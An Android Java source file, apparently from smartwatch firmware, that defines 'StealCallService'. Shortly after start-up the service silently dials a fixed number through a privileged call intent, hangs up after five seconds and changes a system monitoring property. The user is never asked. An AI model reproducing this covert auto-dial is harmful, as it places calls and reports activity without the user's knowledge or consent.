package com.ctyon.watch.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.telecom.TelecomManager;
import android.telephony.TelephonyManager;
import android.util.Log;

public class StealCallService extends Service {

    public Handler  mHandler = new Handler(){
        @Override
        public void handleMessage(Message msg) {


        }
    };
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
       final TelecomManager telecommanager = (TelecomManager)getApplicationContext().getSystemService(Context.TELECOM_SERVICE);
        final   TelephonyManager telephonymanager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if(telephonymanager.getSimState() != TelephonyManager.SIM_STATE_ABSENT && telephonymanager.getSimState() != TelephonyManager.SIM_STATE_UNKNOWN){
                    Log.i("wenyian", "run: 开始打电话");
                    android.os.SystemProperties.set("persist.sys.monitor", "0");
                    Intent intent = new Intent("android.intent.action.CALL_PRIVILEGED", Uri.parse("tel:43215678"));
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    mHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            Log.i("wenyian", "run: 电话结束了");
                            telecommanager.endCall();
                            stopSelf();
                        }
                    },5*1000);
                } else {
                    stopSelf();
                }
            }
        },8*1000);

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }
}
